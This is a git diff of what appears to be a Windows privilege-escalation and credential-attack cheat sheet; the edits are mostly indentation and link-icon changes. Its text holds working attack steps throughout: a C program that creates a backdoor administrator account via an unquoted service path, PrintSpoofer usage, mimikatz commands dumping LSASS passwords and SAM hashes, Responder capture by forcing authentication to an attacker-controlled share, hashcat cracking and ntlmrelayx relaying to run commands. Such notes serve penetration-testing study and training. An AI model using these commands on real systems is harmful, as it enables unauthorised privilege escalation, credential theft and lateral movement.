@@ -90,7 +90,7 @@ type C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine
 
 **Retrieve transcript**
 
-`Start-Transcript` \[[🔗](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.host/start-transcript?view=powershell-7.5)] starts recording everything that happens in your PowerShell session. 
+`Start-Transcript` \[[↗](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.host/start-transcript?view=powershell-7.5)] starts recording everything that happens in your PowerShell session. 
 
 By default, it stores the transcript in the following location using the default name:
 * On Windows: `$HOME\Documents`
@@ -197,49 +197,50 @@ int main ()
 Now there are two way:
 
 1. Restart the service:
-```powershell
-# 1. with net
-net stop mysql
-net start mysql
 
-# 2. Restart-Service
-Restart-Service -Name "mysql"
-```
+    ```powershell
+    # 1. with net
+    net stop mysql
+    net start mysql
+
+    # 2. Restart-Service
+    Restart-Service -Name "mysql"
+    ```
 
 2. If your user doesn't have sufficient permissions to stop the service our alternative is to reboot the machine. If the service’s Startup Type is set to `Auto`, it should restart on boot
 
-```powershell
-Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'} 
+    ```powershell
+    Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'} 
 
-Name StartMode
----- ---------
-mysql Auto
-```
+    Name StartMode
+    ---- ---------
+    mysql Auto
+    ```
 
-To reboot, the user needs `SeShutDownPrivilege`
-```powershell
-whoami /priv
+    To reboot, the user needs `SeShutDownPrivilege`
+    ```powershell
+    whoami /priv
 
-Privilege Name      Description           State
-=================== ====================  ========
-SeShutdownPrivilege Shut down the system  Disabled
-```
+    Privilege Name      Description           State
+    =================== ====================  ========
+    SeShutdownPrivilege Shut down the system  Disabled
+    ```
 
-{{< hint style=notes >}}
-**Note**: The `Disabled` state means the privilege isn't active in the current process. Here, it shows whoami hasn't requested `SeShutdownPrivilege` privilege.
-{{< /hint >}}
+   {{< hint style=notes >}}
+   **Note**: The `Disabled` state means the privilege isn't active in the current process. Here, it shows whoami hasn't requested `SeShutdownPrivilege` privilege.
+   {{< /hint >}}
 
-Reboot:
-```powershell
-shutdown /r /t 0
-```
+    Reboot:
+    ```powershell
+    shutdown /r /t 0
+    ```
 
 ---
 
 ## Service DLL Hijacking
 
 {{< details summary="DLL search order" >}}
-By default, modern Windows versions have safe DLL search mode enabled to reduce DLL hijacking risks. This mode, introduced by Microsoft, enforces a more secure DLL search order \[[🔗](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)], as shown below:
+By default, modern Windows versions have safe DLL search mode enabled to reduce DLL hijacking risks. This mode, introduced by Microsoft, enforces a more secure DLL search order \[[↗](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)], as shown below:
 
 1. The directory from which the application loaded.
 2. The system directory.
@@ -264,9 +265,9 @@ We can use Process Monitor (Procmon) to capture and filter events related to the
 * **Add a filter** to show only events related to the service's process name.
 * **Restart the service** while Procmon is actively capturing:
 
-```powershell
-Restart-Service <service>
-```
+    ```powershell
+    Restart-Service <service>
+    ```
 
 * **Look for CreateFile events** where the service attempts to access a <name>.dll file across different directories.
 
@@ -340,22 +341,22 @@ If `C:\Program Files\My App\bin\service.exe` doesn't exist, you can place a file
 **To exploit this**:
 * There must be an `unquoted service path` with spaces in it.
 
-```dos
-wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """
-```
+    ```dos
+    wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """
+    ```
 
 * One of the earlier-resolved paths must be `writable` by a low-privileged user. To check access rights, use `icacls` in each path. 
 * You must be able to `create a malicious executable` in that path.
 
-```C
-#include <stdlib.h>
-int main ()
-  {
-    int i;
-    i = system ("net user testuser somepassword /add");
-    i = system ("net localgroup administrators testuser /add");
-  }
-```
+    ```C
+    #include <stdlib.h>
+    int main ()
+      {
+        int i;
+        i = system ("net user testuser somepassword /add");
+        i = system ("net localgroup administrators testuser /add");
+      }
+    ```
 
 * The service must `restart` (manually or through a system reboot).
 
@@ -381,11 +382,12 @@ If a task runs something like:
 **To exploit this**:
 
 1. We can view scheduled task with the following command:
-```powershell
-schtasks /query /fo LIST /v
-```
 
-Look for tasks with interesting information in the `Task To Run`, `Run As User`, `Next Run Time`, `Author` fields.
+    ```powershell
+    schtasks /query /fo LIST /v
+    ```
+
+    Look for tasks with interesting information in the `Task To Run`, `Run As User`, `Next Run Time`, `Author` fields.
 
 2. If you find a task running under a **high-privilege user**, check the permissions on the file it executes using `icalcs`.
 
@@ -410,31 +412,31 @@ This works on **Windows 10** and **Server 2016/2019**
 
 1. Verify privileges:
 
-```powershell
-whoami /priv
-```
-Look for:
+    ```powershell
+    whoami /priv
+    ```
+    Look for:
 
-```powershell
-Privilege Name                Description                    State
-============================  =============================  ========
-SeImpersonatePrivilege        Impersonate a client after...  Enabled
-```
+    ```powershell
+    Privilege Name                Description                    State
+    ============================  =============================  ========
+    SeImpersonatePrivilege        Impersonate a client after...  Enabled
+    ```
 
 2. Copy the executable of PrintSpoofer.exe from [PrintSpoofer repository](https://github.com/itm4n/PrintSpoofer).
 
 3. Execute it:
 
-```powershell
-.\PrintSpoofer64.exe -i -c cmd
-```
-Troubleshooting: https://juggernaut-sec.com/seimpersonateprivilege/#Troubleshooting_PrintSpoofer_Errors
-Blog post: https://itm4n.github.io/printspoofer-abusing-impersonate-privileges
-{{< /details >}}
+    ```powershell
+    .\PrintSpoofer64.exe -i -c cmd
+    ```
+    Troubleshooting: https://juggernaut-sec.com/seimpersonateprivilege/#Troubleshooting_PrintSpoofer_Errors
+    Blog post: https://itm4n.github.io/printspoofer-abusing-impersonate-privileges
+    {{< /details >}}
 
-{{< hint style=notes >}}
-**Note**: There are other tools available to accomplish this, such as **Juicy Potato**, **Rogue Potato**, etc.
-{{< /hint >}}
+   {{< hint style=notes >}}
+   **Note**: There are other tools available to accomplish this, such as **Juicy Potato**, **Rogue Potato**, etc.
+   {{< /hint >}}
 
 ---
 
@@ -602,23 +604,25 @@ The most powerful credential-dumping tool.
 
 2. **Enable Debug Privileges**. This should be a standard for running mimikatz as it `SeDebugPrivilege` access right enabled to run command such as `sekurlsa::logonpasswords` and `lsadump::sam`.
 
-```dos
-mimikatz # privilege::debug
-Privilege '20' OK
-```
+    ```dos
+    mimikatz # privilege::debug
+    Privilege '20' OK
+    ```
 
-This should return **Privilege '20' OK**.
+    This should return **Privilege '20' OK**.
 
 3. **Extract Logon Passwords**. This command parses the LSASS process memory for credentials of logged-on users.
-```dos
-sekurlsa::logonpasswords
-```
+
+    ```dos
+    sekurlsa::logonpasswords
+    ```
 
 4. **Dump NTLM hashes** from the SAM. You must first run `token::elevate` to elevate to `SYSTEM` user privileges.
-```dos
-mimikatz # token::elevate
-mimikatz # lsadump::sam
-```
+
+    ```dos
+    mimikatz # token::elevate
+    mimikatz # lsadump::sam
+    ```
 
 ---
 
@@ -628,37 +632,37 @@ If you cannot dump hashes directly, you can capture a **Net-NTLMv2** hash. This 
 
 1. **Set up a fake SMB/HTTP server** using **[Responder](https://github.com/lgandx/Responder)** or similar tool.
 
-```sh
-# sudo responder -I <your_network_interface> -v
-sudo responder -I tap0 -v
-```
+    ```sh
+    # sudo responder -I <your_network_interface> -v
+    sudo responder -I tap0 -v
+    ```
 
 2. **Trigger Authentication**. Force a Windows machine to authenticate to your listener.
  
-* **From a Shell**: If you have command execution, request a resource from your attacker machine's fake share.
+    * **From a Shell**: If you have command execution, request a resource from your attacker machine's fake share.
 
-```sh
-dir \\<your_ip>\share
-```
+    ```sh
+    dir \\<your_ip>\share
+    ```
 
-* **From a Web App**: If there's a feature that processes UNC paths (e.g., file upload, avatar from URL), provide a path to your listener.
+    * **From a Web App**: If there's a feature that processes UNC paths (e.g., file upload, avatar from URL), provide a path to your listener.
 
-```sh
-\\<your_ip>\share\nonexistent.pdf
-```
+    ```sh
+    \\<your_ip>\share\nonexistent.pdf
+    ```
 
 
 3. **Capture the Hash**: Responder will capture the challenge-response exchange. The hash will look something like this:
 
-```sh
-[SMB] NTLMv2-SSP Hash Captured: user::domain:challenge:response_hash
-```
+    ```sh
+    [SMB] NTLMv2-SSP Hash Captured: user::domain:challenge:response_hash
+    ```
 
 4. **Crack the Hash**: Use a tool like Hashcat with mode 5600 to crack the captured hash offline.
 
-```sh
-hashcat -m 5600 ntlmv2.hash /usr/share/wordlists/rockyou.txt
-```
+    ```sh
+    hashcat -m 5600 ntlmv2.hash /usr/share/wordlists/rockyou.txt
+    ```
 
 ---
 
@@ -672,25 +676,25 @@ This technique is used when you have captured a user's Net-NTLMv2 hash but canno
 
 1. **Setup (on Attacker Machine)**: Use `impacket-ntlmrelayx` to listen for a connection and relay it to the target, executing a command upon success.
 
-```sh
-impacket-ntlmrelayx -t [Target_2_IP] -c "[Command_to_Execute]" -smb2support
-```
+    ```sh
+    impacket-ntlmrelayx -t [Target_2_IP] -c "[Command_to_Execute]" -smb2support
+    ```
 
 2. Trigger (on Source Machine: TARGET_1)
 
-```sh
-ls \\<your_ip>\share
-```
+    ```sh
+    ls \\<your_ip>\share
+    ```
 
 3. Relay (by Attacker Machine)
 
-The `ntlmrelayx` tool intercepts the authentication attempt from TARGET_1. It does not authenticate it. Instead, it forwards (relays) the hash to the specified target, TARGET_2.
+    The `ntlmrelayx` tool intercepts the authentication attempt from TARGET_1. It does not authenticate it. Instead, it forwards (relays) the hash to the specified target, TARGET_2.
 
 4. Execution (on Target Machine: TARGET_2)
 
-TARGET_2 receives the relayed authentication request and validates the TARGET_2_admin hash. 
+    TARGET_2 receives the relayed authentication request and validates the TARGET_2_admin hash. 
 
-**IF** TARGET_2_admin is a local administrator **AND** UAC remote restrictions are disabled, the authentication succeeds. TARGET_2 then executes the payload supplied by `ntlmrelayx` in Step 1.
+    **IF** TARGET_2_admin is a local administrator **AND** UAC remote restrictions are disabled, the authentication succeeds. TARGET_2 then executes the payload supplied by `ntlmrelayx` in Step 1.
 
 
 ---
